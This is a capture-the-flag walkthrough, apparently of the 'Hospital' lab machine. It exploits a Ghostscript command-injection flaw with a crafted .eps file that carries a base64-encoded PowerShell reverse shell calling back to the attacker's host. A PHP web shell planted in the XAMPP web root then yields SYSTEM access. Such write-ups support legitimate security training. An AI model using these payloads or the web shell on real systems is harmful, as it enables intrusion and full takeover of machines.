With drwilliams we go into the https://hospital.htb:443/ webapp

![[Pasted image 20231120142319.png]]

Here we found a mail asking us for a .eps file for Ghostscript, after some searching in google we found **[this exploit](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)**. We craft a evil .eps file (payload with http://www.revshells.com)

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Hospital-10.10.11.241]
└─$ python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --filename run_pel --extension eps
[+] Generated EPS payload file: run_pel.eps
```

We repy the mail with the evil .eps file a we catch the reverse shell with a netcat listener

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4443
listening on [any] 4443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.241] 6364
PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

For privilege escalation we found C:\\xampp\\htdocs directory and uploading a shell in here executes as root. To trigger the payload we access to this location:
https://hospital.htb/bash.php?cmd=powershell+-e+<ENCODED B64 PAYLOAD>

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Hospital-10.10.11.241]
└─$ echo '<?php system($_GET["cmd"]); ?>' > bash.php

┌──(kali㉿kali)-[~/Documents/Boxes/Hospital-10.10.11.241]
└─$ nc -nvlp 4443                                                                           
listening on [any] 4443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.241] 24107
whoami
nt authority\system
```